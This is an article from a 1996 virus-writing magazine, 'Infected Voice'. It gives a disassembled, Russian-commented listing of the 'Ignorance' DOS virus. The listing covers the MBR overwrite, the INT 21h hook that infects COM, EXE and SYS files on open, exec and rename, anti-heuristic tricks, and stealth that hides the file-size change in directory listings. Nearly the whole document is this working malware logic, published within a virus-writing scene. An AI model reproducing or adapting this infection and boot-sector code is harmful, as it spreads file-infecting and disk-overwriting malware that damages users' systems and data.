;
;      ▄▄                  █
;     ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       IV   1996
;     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀▀█
;      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █ █▀█ █
;       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ █ █ █ █
;       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █ █▄█ █
;       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄▄█
;          (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.
;
;-------------------------------------------------------
;>> Ignorance - MBR, COM, EXE, SYS infector. 1979 bytes.
;>> Comments by Eternal Maverick
;-------------------------------------------------------
; Не трудно заметить, что это не исходник вируса
; и не преднозначено для перекомпиляции.
; Не переделывайте чужие вирусы - пишите свои ;-)
; Получен этот код так:
; В отладчик был загнан зараженный COM файл длиной
; 2000 байт. После выполнения первого перехода и
; расшифровки дамп был скинут в файл. Вот и все...
; Все числа - шестнадцатиричные, многие смещения
; берутся в памяти, что вносит путаницу ;-(
;---------------------------------------------------
; P.S. Извините за неполные и глючные комментарии...
;---------------------------------------------------
;-------------------------------------
; Сохранить вектор 4Сh и установить
;          его на CS:8EA.
;-------------------------------------
20ED:08D0 33C0           XOR    AX,AX
20ED:08D2 8ED8           MOV    DS,AX
20ED:08D4 BE3001         MOV    SI,0130
20ED:08D7 FF34           PUSH   [SI]
20ED:08D9 FF7402         PUSH   [SI+02]
20ED:08DC C704DA08       MOV    [SI],08DA
20ED:08E0 8CC8           MOV    AX,CS
20ED:08E2 40             INC    AX
20ED:08E3 894402         MOV    [SI+02],AX

;-------------------------------------
; Антиэвристика. Передать управление
;          по адресу 8EA.
;-------------------------------------

20ED:08E6 CD4C           INT    4C

20ED:08E8 CD20           INT    20

;-------------------------------------
; Вызвать процедуру расшифровки кода
;    и восстановления вектора 4Ch.
;-------------------------------------
20ED:08EA E87107         CALL   105E
;-------------------------------------
; Расшифрованный код...
;-------------------------------------
20ED:08ED FC             CLD
20ED:08EE 81EE8D07       SUB    SI,078D
20ED:08F2 55             PUSH   BP
20ED:08F3 8CC5           MOV    BP,ES           ; Сохранить ES
20ED:08F5 704A           JO     0941            ; Нас запустили из SYS ?

20ED:08F7 83C402         ADD    SP,0002         ; Освободить стек

20ED:08FA E8B806         CALL   0FB5            ; Проверка на себя...
20ED:08FD 7409           JZ     0908            ; Уже инсталлирован!

; Начинаем инсталляцию...

20ED:08FF B83600         MOV    AX,0036
20ED:0902 50             PUSH   AX
20ED:0903 E91F05         JMP    0E25

20ED:0906 33F6           XOR    SI,SI

20ED:0908 8EC5           MOV    ES,BP           ; Восстановить ES
20ED:090A 0E             PUSH   CS
20ED:090B 1F             POP    DS
20ED:090C 81C62307       ADD    SI,0723         ; А может это EXE
20ED:0910 7009           JO     091B            ; Точно EXE

20ED:0912 BF0001         MOV    DI,0100
20ED:0915 55             PUSH   BP
20ED:0916 57             PUSH   DI
20ED:0917 A5             MOVSW
20ED:0918 A4             MOVSB                  ; Восстановить первые 3 байта
                                                ; COM файла
20ED:0919 EB15           JMP    0930            ; На выход

;--------------------------------------
;       Восствановить стек
;       и передать управление
;       по адресу из заголовка
;--------------------------------------
20ED:091B 83C510         ADD    BP,0010
20ED:091E AD             LODSW
20ED:091F 03C5           ADD    AX,BP
20ED:0921 93             XCHG   AX,BX
20ED:0922 AD             LODSW
20ED:0923 8ED3           MOV    SS,BX
20ED:0925 94             XCHG   AX,SP
20ED:0926 AD             LODSW
20ED:0927 93             XCHG   AX,BX
20ED:0928 AD             LODSW
20ED:0929 03C5           ADD    AX,BP
20ED:092B 50             PUSH   AX
20ED:092C 53             PUSH   BX
20ED:092D 83ED10         SUB    BP,0010

20ED:0930 33C0           XOR    AX,AX
20ED:0932 8BD8           MOV    BX,AX
20ED:0934 89C1           MOV    CX,AX
20ED:0936 8BD0           MOV    DX,AX
20ED:0938 8BF0           MOV    SI,AX
20ED:093A 8BF8           MOV    DI,AX
20ED:093C 8EDD           MOV    DS,BP
20ED:093E 89C5           MOV    BP,AX
20ED:0940 CB             RET    Far

20ED:0941 8B842307       MOV    AX,[0723+SI]
20ED:0945 2EA30600       MOV    CS:[0006],AX
20ED:0949 5D             POP    BP
20ED:094A 50             PUSH   AX
20ED:094B 53             PUSH   BX
20ED:094C 51             PUSH   CX
20ED:094D 52             PUSH   DX
20ED:094E 06             PUSH   ES
20ED:094F 33C0           XOR    AX,AX
20ED:0951 BA8000         MOV    DX,0080
20ED:0954 CD13           INT    13
20ED:0956 7228           JC     0980
20ED:0958 E85A06         CALL   0FB5
20ED:095B 7423           JZ     0980
20ED:095D E81506         CALL   0F75
20ED:0960 33FF           XOR    DI,DI
20ED:0962 B9BB07         MOV    CX,07BB
20ED:0965 F3A4           REP    MOVSB
20ED:0967 B89C00         MOV    AX,009C
20ED:096A 50             PUSH   AX
20ED:096B C3             RET

20ED:096C E87C05         CALL   0EEB
20ED:096F 0E             PUSH   CS
20ED:0970 1F             POP    DS
20ED:0971 E84303         CALL   0CB7
20ED:0974 7308           JNC    097E
20ED:0976 B419           MOV    AH,19
20ED:0978 CD21           INT    21
20ED:097A 92             XCHG   AX,DX
20ED:097B E88C03         CALL   0D0A
20ED:097E EBFE           JMP    097E
20ED:0980 07             POP    ES
20ED:0981 5A             POP    DX
20ED:0982 59             POP    CX
20ED:0983 5B             POP    BX
20ED:0984 58             POP    AX
20ED:0985 FFE0           JMP    AX
20ED:0987 3DCEA7         CMP    AX,A7CE
20ED:098A 7519           JNZ    09A5
20ED:098C 93             XCHG   AX,BX
20ED:098D 0E             PUSH   CS
20ED:098E 07             POP    ES
20ED:098F CF             IRET

20ED:0990                Db     'Ignorance is Strength'

20ED:09A5 50             PUSH   AX
20ED:09A6 D0EC           SHR    AH,1
20ED:09A8 80FC01         CMP    AH,01
20ED:09AB 753E           JNZ    09EB
20ED:09AD 80FA80         CMP    DL,80
20ED:09B0 723F           JC     09F1
20ED:09B2 7737           JA     09EB
20ED:09B4 0AF6           OR     DH,DH
20ED:09B6 7533           JNZ    09EB
20ED:09B8 83F901         CMP    CX,0001
20ED:09BB 772E           JA     09EB
20ED:09BD 58             POP    AX
20ED:09BE 3D0903         CMP    AX,0309
20ED:09C1 7329           JNC    09EC
20ED:09C3 E88705         CALL   0F4D    ; Сохранить регистры...
20ED:09C6 50             PUSH   AX
20ED:09C7 B001           MOV    AL,01
20ED:09C9 B90900         MOV    CX,0009
20ED:09CC E84605         CALL   0F15
20ED:09CF 58             POP    AX
20ED:09D0 FEC8           DEC    AL
20ED:09D2 740B           JZ     09DF
20ED:09D4 81C30002       ADD    BX,0200
20ED:09D8 E83A05         CALL   0F15
20ED:09DB 81EB0002       SUB    BX,0200
20ED:09DF E87F05         CALL   0F61            ; Восстановление регистров...
20ED:09E2 40             INC    AX
20ED:09E3 32E4           XOR    AH,AH
20ED:09E5 CA0200         RET    Far  0002

20ED:09E8 E87605         CALL   0F61            ; Восстановление регистров...
20ED:09EB 58             POP    AX
20ED:09EC 2EFF2EC607     JMP    Far CS:[07C6]

20ED:09F1 E85905         CALL   0F4D            ; Сохранить регистры...
20ED:09F4 33C0           XOR    AX,AX
20ED:09F6 8ED8           MOV    DS,AX
20ED:09F8 FEC2           INC    DL
20ED:09FA 84163F04       TEST   [043F],DL
20ED:09FE 75E8           JNZ    09E8
20ED:0A00 FECA           DEC    DL
20ED:0A02 E87005         CALL   0F75
20ED:0A05 E80203         CALL   0D0A
20ED:0A08 E85605         CALL   0F61            ; Восстановление регистров...
20ED:0A0B EBDE           JMP    09EB

20ED:0A0D                Db     'Freedom is Slavery'

;-----------------------------------
; Если 21h переустановлено, то это
; надо исправить...
;-----------------------------------
20ED:0A1F E82B05         CALL   0F4D            ; Сохранить регистры...
20ED:0A22 0E             PUSH   CS
20ED:0A23 07             POP    ES
20ED:0A24 33C0           XOR    AX,AX
20ED:0A26 8ED8           MOV    DS,AX
20ED:0A28 BE8400         MOV    SI,0084
20ED:0A2B BFCA07         MOV    DI,07CA
20ED:0A2E FC             CLD
20ED:0A2F A7             CMPSW
20ED:0A30 7410           JZ     0A42
20ED:0A32 A7             CMPSW
20ED:0A33 740D           JZ     0A42
20ED:0A35 E8C404         CALL   0EFC
20ED:0A38 0E             PUSH   CS
20ED:0A39 1F             POP    DS
20ED:0A3A BEC207         MOV    SI,07C2
20ED:0A3D 8D7C04         LEA    DI,[SI+04]
20ED:0A40 A5             MOVSW
20ED:0A41 A5             MOVSW
20ED:0A42 E81C05         CALL   0F61            ; Восстановление регистров...
20ED:0A45 2EFF2EC207     JMP    Far CS:[07C2]

;---------------------------------------
;       Обработчик INT 21h
;---------------------------------------
20ED:0A4A 80FC11         CMP    AH,11
20ED:0A4D 7456           JZ     0AA5    ; Маскировка...
20ED:0A4F 80FC12         CMP    AH,12
20ED:0A52 7451           JZ     0AA5    ; Маскировка...
20ED:0A54 80FC3C         CMP    AH,3C
20ED:0A57 744E           JZ     0AA7    ; Обработка создания файла...
20ED:0A59 80FC3E         CMP    AH,3E
20ED:0A5C 7460           JZ     0ABE    ; Закрыть файл...
20ED:0A5E 50             PUSH   AX
20ED:0A5F 86C4           XCHG   AL,AH   ; Это наверное против
                                        ; антивирусов. Глупо, но работает!
20ED:0A61 3C3D           CMP    AL,3D
20ED:0A63 7419           JZ     0A7E    ; Заражать...
20ED:0A65 3C43           CMP    AL,43
20ED:0A67 7415           JZ     0A7E    ; Заражать...
20ED:0A69 3C4B           CMP    AL,4B
20ED:0A6B 7411           JZ     0A7E    ; Заражать...
20ED:0A6D 3C56           CMP    AL,56
20ED:0A6F 740D           JZ     0A7E    ; Заражать...
20ED:0A71 3C6C           CMP    AL,6C
20ED:0A73 750C           JNZ    0A81    ; Если не создание, то на выход...
                                        ; ИНАЧЕ:
20ED:0A75 52             PUSH   DX
20ED:0A76 89F2           MOV    DX,SI
20ED:0A78 E8C100         CALL   0B3C    ; Заразить файл
20ED:0A7B 5A             POP    DX
20ED:0A7C EB03           JMP    0A81    ; и на выход.

20ED:0A7E E8BB00         CALL   0B3C    ; Заражать...
20ED:0A81 58             POP    AX

20ED:0A82 2EFF2ECA07     JMP    Far CS:[07CA]   ; Переход на int 21h

20ED:0A87                Db     'War is Peace'

;--------------------------------------
;    Финты для сокращения кода.
;--------------------------------------
20ED:0A93 B80242         MOV    AX,4202
20ED:0A96 EB03           JMP    0A9B

20ED:0A97 B80042         MOV    AX,4200
20ED:0A9B 33C9           XOR    CX,CX
20ED:0A9D 33D2           XOR    DX,DX
;------------------------------------
; Вызов прерывания 21h
;------------------------------------
20ED:0A9F 9C             PUSHF
20ED:0AA0 0E             PUSH   CS
20ED:0AA1 E8DEFF         CALL   0A82
20ED:0AA4 C3             RET

20ED:0AA5 EB32           JMP    0AD9    ; Переход на процедуру маскировки...

20ED:0AA7 E8F5FF         CALL   0A9F    ; Вызов int 21h
20ED:0AAA 720D           JC     0AB9    ; Что-то он не создается...
20ED:0AAC 2EA3E607       MOV    CS:[07E6],AX    ; Запомним handle
20ED:0AB0 E89A04         CALL   0F4D    ; Интересная техника...
                                        ; Процедура служит для сохранения
                                        ; регистров и все...
20ED:0AB3 E8F802         CALL   0DAE    ; Скопируем имя файла в буфер...
20ED:0AB6 E8A804         CALL   0F61    ; Восстановление регистров...
20ED:0AB9 CA0200         RET    Far  0002       ; Все...

20ED:0ABC E9012E         JMP    38C0    ; Здесь наворот. По одному коду
                                        ; проезджает дважды. Смотри переход
                                        ; после CMP AH,3E...
20ED:0ABF FF36EC01       PUSH   [01EC]  ; Эта команда будет PUSH CS:[01EC]
                                        ; Префикс 2E берется из предыдущей...

20ED:0AC3 E8D9FF         CALL   0A9F    ; Вызов 21h
20ED:0AC6 7210           JC     0AD8    ; Ничего не получается...
20ED:0AC8 2E391EE607     CMP    CS:[07E6],BX ; Не созданный ли файл закрывают?
20ED:0ACD 7509           JNZ    0AD8    ; Нет, какой-то другой...
20ED:0ACF E87B04         CALL   0F4D    ; Сохранить регистры...
20ED:0AD2 E96D00         JMP    0B42    ; Едем дальше...

20ED:0AD5 E88904         CALL   0F61    ; Восстановление регистров...
20ED:0AD8 C3             RET

20ED:0AD9 E8C3FF         CALL   0A9F    ; Вызов int 21h
20ED:0ADC 0AC0           OR     AL,AL
20ED:0ADE 755B           JNZ    0B3B    ; Найден ли файл?
                                        ; Если нет, то всё...

20ED:0AE0 2EC6065B0270   MOV    CS:[025B],70

20ED:0AE6 50             PUSH   AX
20ED:0AE7 53             PUSH   BX
20ED:0AE8 51             PUSH   CX
20ED:0AE9 1E             PUSH   DS
20ED:0AEA 06             PUSH   ES
20ED:0AEB 2E803E430701   CMP    CS:[0743],01
20ED:0AF1 7508           JNZ    0AFB
20ED:0AF3 2EC6065B02EB   MOV    CS:[025B],EB
20ED:0AF9 EB0E           JMP    0B09    ; Продолжаем там...

20ED:0AFB B451           MOV    AH,51
20ED:0AFD E89FFF         CALL   0A9F    ; Получаем сегмент PSP выполняемой
                                        ; программы...

20ED:0B00 8EC3           MOV    ES,BX
20ED:0B02 263B1E1600     CMP    BX,ES:[0016] ; Имеет ли данный процесс
                                             ; родительский ?
20ED:0B07 752D           JNZ    0B36         ; Да, имеет... На выход!

20ED:0B09 89D3           MOV    BX,DX
20ED:0B0B 8A07           MOV    AL,[BX]
20ED:0B0D 50             PUSH   AX
20ED:0B0E B42F           MOV    AH,2F
20ED:0B10 E88CFF         CALL   0A9F    ; Получить DTA
20ED:0B13 58             POP    AX
20ED:0B14 FEC0           INC    AL
20ED:0B16 06             PUSH   ES
20ED:0B17 1F             POP    DS
20ED:0B18 7503           JNZ    0B1D    ; Расширенный FCB - ?

20ED:0B1A 83C307         ADD    BX,0007 ; Нет, обыкновенный

20ED:0B1D 8B4719         MOV    AX,[BX+19]
20ED:0B20 80FCC8         CMP    AH,C8           ; Зараженный файл ?
20ED:0B23 7211           JC     0B36
20ED:0B25 80ECC8         SUB    AH,C8
20ED:0B28 894719         MOV    [BX+19],AX
20ED:0B2B 7009           JO     0B36
20ED:0B2D 816F1DBB07     SUB    [BX+1D],07BB    ; Маскировка длинны.
20ED:0B32 835F1F00       SBB    [BX+1F],0000    ; Вы это 100 раз видели...
20ED:0B36 07             POP    ES
20ED:0B37 1F             POP    DS
20ED:0B38 59             POP    CX
20ED:0B39 5B             POP    BX
20ED:0B3A 58             POP    AX

20ED:0B3B CF             IRET

20ED:0B3C E80E04         CALL   0F4D          ; Сохраняем регистры...
20ED:0B3F E86C02         CALL   0DAE          ; Копируем имя файла в буфер...
;-----------------------------------------------
; Заражаем файлец по всем правилам:
; Переустанавливаем 24h, сохраняем атрибуты, дату
; и время создания и т. д.
;-----------------------------------------------
20ED:0B42 E83004         CALL   0F75
20ED:0B45 E87802         CALL   0DC0
20ED:0B48 726D           JC     0BB7
20ED:0B4A C606BD0700     MOV    [07BD],00
20ED:0B4F C606250070     MOV    [0025],70
20ED:0B54 B82435         MOV    AX,3524
20ED:0B57 E845FF         CALL   0A9F
20ED:0B5A 06             PUSH   ES
20ED:0B5B 53             PUSH   BX
20ED:0B5C BA6B02         MOV    DX,026B
20ED:0B5F B82425         MOV    AX,2524
20ED:0B62 E83AFF         CALL   0A9F
20ED:0B65 0E             PUSH   CS
20ED:0B66 07             POP    ES
20ED:0B67 BAE807         MOV    DX,07E8
20ED:0B6A B80043         MOV    AX,4300
20ED:0B6D E82FFF         CALL   0A9F
20ED:0B70 51             PUSH   CX
20ED:0B71 B80143         MOV    AX,4301
20ED:0B74 33C9           XOR    CX,CX
20ED:0B76 E826FF         CALL   0A9F
20ED:0B79 7255           JC     0BD0
20ED:0B7B B8023D         MOV    AX,3D02
20ED:0B7E BAE807         MOV    DX,07E8
20ED:0B81 E81BFF         CALL   0A9F
20ED:0B84 724A           JC     0BD0
20ED:0B86 93             XCHG   AX,BX
20ED:0B87 B80057         MOV    AX,5700
20ED:0B8A E812FF         CALL   0A9F
20ED:0B8D 51             PUSH   CX
20ED:0B8E 52             PUSH   DX
20ED:0B8F 80FEC8         CMP    DH,C8
20ED:0B92 7325           JNC    0BB9    ; Если уже заражен...

20ED:0B94 BACE07         MOV    DX,07CE
20ED:0B97 B43F           MOV    AH,3F
20ED:0B99 B91800         MOV    CX,0018
20ED:0B9C E800FF         CALL   0A9F
20ED:0B9F 33C1           XOR    AX,CX
20ED:0BA1 7516           JNZ    0BB9    ; Хреново прочитался...
                                        ; Ну его на фиг !

20ED:0BA3 89D6           MOV    SI,DX
20ED:0BA5 AC             LODSB
20ED:0BA6 3C4D           CMP    AL,4D
20ED:0BA8 743E           JZ     0BE8    ; Переходим к EXE файлам...
20ED:0BAA 3C5A           CMP    AL,5A
20ED:0BAC 743A           JZ     0BE8    ; И это тоже EXE...

20ED:0BAE 803EBB0701     CMP    [07BB],01
20ED:0BB3 743D           JZ     0BF2

20ED:0BB5 EB36           JMP    0BED

20ED:0BB7 EB2B           JMP    0BE4
;----------------------------------------
; Общий код при заражении всех файлов...
; Восстановление атрибутов и т.д.
;----------------------------------------
20ED:0BB9 5A             POP    DX
20ED:0BBA 59             POP    CX
20ED:0BBB 803EBD0700     CMP    [07BD],00
20ED:0BC0 7403           JZ     0BC5
20ED:0BC2 80C6C8         ADD    DH,C8   ; Поставим метку ЗАРАЖЕН...
20ED:0BC5 B80157         MOV    AX,5701
20ED:0BC8 E8D4FE         CALL   0A9F
20ED:0BCB B43E           MOV    AH,3E
20ED:0BCD E8CFFE         CALL   0A9F
20ED:0BD0 0E             PUSH   CS
20ED:0BD1 1F             POP    DS
20ED:0BD2 59             POP    CX
20ED:0BD3 B80143         MOV    AX,4301
20ED:0BD6 BAE807         MOV    DX,07E8
20ED:0BD9 E8C3FE         CALL   0A9F
20ED:0BDC 5A             POP    DX
20ED:0BDD 1F             POP    DS
20ED:0BDE B82425         MOV    AX,2524
20ED:0BE1 E8BBFE         CALL   0A9F
20ED:0BE4 E87A03         CALL   0F61    ; Восстановление регистров...
20ED:0BE7 C3             RET
;---------------------------------------
; Обработка EXE
;---------------------------------------
20ED:0BE8 E83700         CALL   0C22
20ED:0BEB EBCC           JMP    0BB9
20ED:0BED E80700         CALL   0BF7
20ED:0BF0 EBC7           JMP    0BB9
;----------------------------------------
; Обработка не EXE
;----------------------------------------
20ED:0BF2 E89000         CALL   0C85
20ED:0BF5 EBC2           JMP    0BB9
20ED:0BF7 BF2307         MOV    DI,0723
20ED:0BFA AA             STOSB
20ED:0BFB A5             MOVSW
20ED:0BFC E894FE         CALL   0A93
20ED:0BFF 0BD2           OR     DX,DX
20ED:0C01 751E           JNZ    0C21    ; Великоват...
20ED:0C03 3D00F0         CMP    AX,F000
20ED:0C06 7319           JNC    0C21    ; Великоват и вирус не влазит...

20ED:0C08 50             PUSH   AX
20ED:0C09 C606400070     MOV    [0040],70
20ED:0C0E FEC4           INC    AH
20ED:0C10 E89A02         CALL   0EAD
20ED:0C13 BFCE07         MOV    DI,07CE
;--------------------------------------
; Создаем первый JMP в файле...
;--------------------------------------
20ED:0C16 B0E9           MOV    AL,E9
20ED:0C18 AA             STOSB
20ED:0C19 58             POP    AX
20ED:0C1A 48             DEC    AX
20ED:0C1B 48             DEC    AX
20ED:0C1C 48             DEC    AX
20ED:0C1D AB             STOSW
20ED:0C1E E98200         JMP    0CA3

20ED:0C21 C3             RET

20ED:0C22 E86EFE         CALL   0A93
20ED:0C25 50             PUSH   AX
20ED:0C26 52             PUSH   DX
20ED:0C27 A1D207         MOV    AX,[07D2]
20ED:0C2A B90002         MOV    CX,0200
20ED:0C2D F7E1           MUL    CX
20ED:0C2F 59             POP    CX
20ED:0C30 5D             POP    BP
20ED:0C31 3BC5           CMP    AX,BP
20ED:0C33 72EC           JC     0C21
20ED:0C35 39CA           CMP    DX,CX
20ED:0C37 72E8           JC     0C21
20ED:0C39 BF2307         MOV    DI,0723
20ED:0C3C BEDC07         MOV    SI,07DC
20ED:0C3F A5             MOVSW
20ED:0C40 A5             MOVSW
20ED:0C41 AD             LODSW
20ED:0C42 A5             MOVSW
20ED:0C43 A5             MOVSW
20ED:0C44 E84CFE         CALL   0A93
20ED:0C47 C6064000EB     MOV    [0040],EB
20ED:0C4C B91000         MOV    CX,0010
20ED:0C4F F7F1           DIV    CX
20ED:0C51 2B06D607       SUB    AX,[07D6]
20ED:0C55 A3E407         MOV    [07E4],AX
20ED:0C58 8916E207       MOV    [07E2],DX
20ED:0C5C 52             PUSH   DX
20ED:0C5D 81C2E617       ADD    DX,17E6
20ED:0C61 D1EA           SHR    DX,1
20ED:0C63 D1E2           SHL    DX,1
20ED:0C65 8916DE07       MOV    [07DE],DX
20ED:0C69 40             INC    AX
20ED:0C6A A3DC07         MOV    [07DC],AX
20ED:0C6D 58             POP    AX
20ED:0C6E E83C02         CALL   0EAD
20ED:0C71 B90002         MOV    CX,0200
20ED:0C74 F7F1           DIV    CX
20ED:0C76 0BD2           OR     DX,DX
20ED:0C78 7401           JZ     0C7B
20ED:0C7A 40             INC    AX
20ED:0C7B 8916D007       MOV    [07D0],DX
20ED:0C7F A3D207         MOV    [07D2],AX
20ED:0C82 E91E00         JMP    0CA3
20ED:0C85 4E             DEC    SI
20ED:0C86 AD             LODSW
20ED:0C87 0BC0           OR     AX,AX
20ED:0C89 7403           JZ     0C8E
20ED:0C8B 40             INC    AX
20ED:0C8C 7593           JNZ    0C21
20ED:0C8E BED407         MOV    SI,07D4
20ED:0C91 BF2307         MOV    DI,0723
20ED:0C94 A5             MOVSW
20ED:0C95 E8FBFD         CALL   0A93
20ED:0C98 8944FE         MOV    [SI-02],AX
20ED:0C9B C6062500EB     MOV    [0025],EB
20ED:0CA0 E80A02         CALL   0EAD
;--------------------------------------
;         Пишем заголовок...
;--------------------------------------
20ED:0CA3 E8F2FD         CALL   0A98
20ED:0CA6 BACE07         MOV    DX,07CE
20ED:0CA9 B91800         MOV    CX,0018
20ED:0CAC B440           MOV    AH,40
20ED:0CAE E8EEFD         CALL   0A9F
20ED:0CB1 C606BD0701     MOV    [07BD],01
20ED:0CB6 C3             RET

20ED:0CB7 B80102         MOV    AX,0201         ; Читать 1 сектор (MBR)
20ED:0CBA BBCE07         MOV    BX,07CE
20ED:0CBD B90100         MOV    CX,0001
20ED:0CC0 BA8000         MOV    DX,0080
20ED:0CC3 E84F02         CALL   0F15            ; Вызов INT 13h
20ED:0CC6 723F           JC     0D07            ; Не читается

20ED:0CC8 813ED007CEA7   CMP    [07D0],A7CE     ; Проверка зараженности MBR
20ED:0CCE 7438           JZ     0D08            ; Уже заражен

20ED:0CD0 B90900         MOV    CX,0009         ; Писать 9 секторов
20ED:0CD3 B80103         MOV    AX,0301
20ED:0CD6 E83C02         CALL   0F15

;------------------------------------------------------
;       Создаем свой MBR и записываем его на место
;------------------------------------------------------
20ED:0CD9 89DF           MOV    DI,BX
20ED:0CDB 8916BD06       MOV    [06BD],DX
20ED:0CDF C706BA060900   MOV    [06BA],0009
20ED:0CE5 BEAA06         MOV    SI,06AA         ; Наш загрузчик
20ED:0CE8 B94500         MOV    CX,0045
20ED:0CEB F3A4           REP    MOVSB
20ED:0CED 41             INC    CX
20ED:0CEE B80103         MOV    AX,0301
20ED:0CF1 C606420701     MOV    [0742],01       ; Заразили - установим флаг
20ED:0CF6 E81C02         CALL   0F15

20ED:0CF9 E82002         CALL   0F1C
20ED:0CFC B80403         MOV    AX,0304
20ED:0CFF 33DB           XOR    BX,BX
20ED:0D01 B90A00         MOV    CX,000A
20ED:0D04 E80E02         CALL   0F15
20ED:0D07 C3             RET

20ED:0D08 F9             STC            ; Не получилось...
20ED:0D09 C3             RET

20ED:0D0A B80102         MOV    AX,0201
20ED:0D0D BB6808         MOV    BX,0868
20ED:0D10 B90100         MOV    CX,0001
20ED:0D13 32F6           XOR    DH,DH
20ED:0D15 E8FD01         CALL   0F15
20ED:0D18 8D7703         LEA    SI,[BX+03]
20ED:0D1B B90800         MOV    CX,0008
20ED:0D1E AC             LODSB
20ED:0D1F 3C20           CMP    AL,20
20ED:0D21 7264           JC     0D87
20ED:0D23 3C7A           CMP    AL,7A
20ED:0D25 7760           JA     0D87
20ED:0D27 E2F5           LOOP   0D1E
20ED:0D29 E85C00         CALL   0D88
20ED:0D2C 51             PUSH   CX
20ED:0D2D 832E7B0805     SUB    [087B],0005
20ED:0D32 E85300         CALL   0D88
20ED:0D35 58             POP    AX
20ED:0D36 2BC1           SUB    AX,CX
20ED:0D38 0404           ADD    AL,04
20ED:0D3A 754B           JNZ    0D87
20ED:0D3C 52             PUSH   DX
20ED:0D3D 32D2           XOR    DL,DL
20ED:0D3F 8916BD06       MOV    [06BD],DX
20ED:0D43 890EBA06       MOV    [06BA],CX
20ED:0D47 B80103         MOV    AX,0301
20ED:0D4A BB6808         MOV    BX,0868
20ED:0D4D 5A             POP    DX
20ED:0D4E E8C401         CALL   0F15
20ED:0D51 7234           JC     0D87
20ED:0D53 C7067108CEA7   MOV    [0871],A7CE
20ED:0D59 41             INC    CX
20ED:0D5A E8BF01         CALL   0F1C
20ED:0D5D B80403         MOV    AX,0304
20ED:0D60 33DB           XOR    BX,BX
20ED:0D62 C606420700     MOV    [0742],00
20ED:0D67 E8AB01         CALL   0F15
20ED:0D6A BF6808         MOV    DI,0868
20ED:0D6D 57             PUSH   DI
20ED:0D6E B8EB34         MOV    AX,34EB
20ED:0D71 AB             STOSW
20ED:0D72 83C734         ADD    DI,0034
20ED:0D75 BEAA06         MOV    SI,06AA
20ED:0D78 B94500         MOV    CX,0045
20ED:0D7B F3A4           REP    MOVSB
20ED:0D7D 5B             POP    BX
20ED:0D7E 41             INC    CX
20ED:0D7F B80103         MOV    AX,0301
20ED:0D82 32F6           XOR    DH,DH
20ED:0D84 E88E01         CALL   0F15
20ED:0D87 C3             RET
20ED:0D88 52             PUSH   DX
20ED:0D89 A17B08         MOV    AX,[087B]
20ED:0D8C 03068408       ADD    AX,[0884]
20ED:0D90 33D2           XOR    DX,DX
20ED:0D92 F7368008       DIV    W/[0880]
20ED:0D96 8BCA           MOV    CX,DX
20ED:0D98 33D2           XOR    DX,DX
20ED:0D9A F7368208       DIV    W/[0882]
20ED:0D9E 5B             POP    BX
20ED:0D9F 88D7           MOV    BH,DL
20ED:0DA1 53             PUSH   BX
20ED:0DA2 51             PUSH   CX
20ED:0DA3 B106           MOV    CL,06
20ED:0DA5 D2E4           SHL    AH,CL
20ED:0DA7 59             POP    CX
20ED:0DA8 02CC           ADD    CL,AH
20ED:0DAA 88C5           MOV    CH,AL
20ED:0DAC 5A             POP    DX
20ED:0DAD C3             RET

;------------------------------------
; Копирование имени файла в буфер...
;------------------------------------
20ED:0DAE 0E             PUSH   CS
20ED:0DAF 07             POP    ES
20ED:0DB0 BFE807         MOV    DI,07E8
20ED:0DB3 57             PUSH   DI
20ED:0DB4 89D6           MOV    SI,DX
20ED:0DB6 AC             LODSB
20ED:0DB7 AA             STOSB
20ED:0DB8 0AC0           OR     AL,AL
20ED:0DBA 75FA           JNZ    0DB6
20ED:0DBC 5A             POP    DX
20ED:0DBD 0E             PUSH   CS
20ED:0DBE 1F             POP    DS
20ED:0DBF C3             RET

;---------------------------------------
; Проверка на неподходящие имена файлов
;---------------------------------------
20ED:0DC0 BEE807         MOV    SI,07E8
20ED:0DC3 AC             LODSB
20ED:0DC4 0AC0           OR     AL,AL
20ED:0DC6 75FB           JNZ    0DC3    ; Где же конец имени...

20ED:0DC8 89F2           MOV    DX,SI
20ED:0DCA 83EA04         SUB    DX,0004
20ED:0DCD 83EE0C         SUB    SI,000C
20ED:0DD0 81FEE807       CMP    SI,07E8
20ED:0DD4 7303           JNC    0DD9
20ED:0DD6 BEE807         MOV    SI,07E8
20ED:0DD9 4E             DEC    SI
20ED:0DDA 3BF2           CMP    SI,DX
20ED:0DDC 7417           JZ     0DF5
20ED:0DDE AD             LODSW
20ED:0DDF 25DFDF         AND    AX,DFDF
20ED:0DE2 57             PUSH   DI
20ED:0DE3 BF3A07         MOV    DI,073A
20ED:0DE6 B90400         MOV    CX,0004
20ED:0DE9 F2AF           REPNZ  SCASW
20ED:0DEB 5F             POP    DI
20ED:0DEC 75EB           JNZ    0DD9
20ED:0DEE C606430701     MOV    [0743],01
20ED:0DF3 EB16           JMP    0E0B
20ED:0DF5 C606430700     MOV    [0743],00
20ED:0DFA BF2B07         MOV    DI,072B
20ED:0DFD B90500         MOV    CX,0005
20ED:0E00 FC             CLD
20ED:0E01 AD             LODSW
20ED:0E02 25DFDF         AND    AX,DFDF
20ED:0E05 AF             SCASW
20ED:0E06 7405           JZ     0E0D
20ED:0E08 47             INC    DI
20ED:0E09 E2FA           LOOP   0E05
20ED:0E0B F9             STC
20ED:0E0C C3             RET
20ED:0E0D AC             LODSB
20ED:0E0E 24DF           AND    AL,DF
20ED:0E10 AE             SCASB
20ED:0E11 75F8           JNZ    0E0B
20ED:0E13 C606BB0700     MOV    [07BB],00
20ED:0E18 81FF3A07       CMP    DI,073A
20ED:0E1C 7205           JC     0E23
20ED:0E1E C606BB0701     MOV    [07BB],01
20ED:0E23 F8             CLC
20ED:0E24 C3             RET

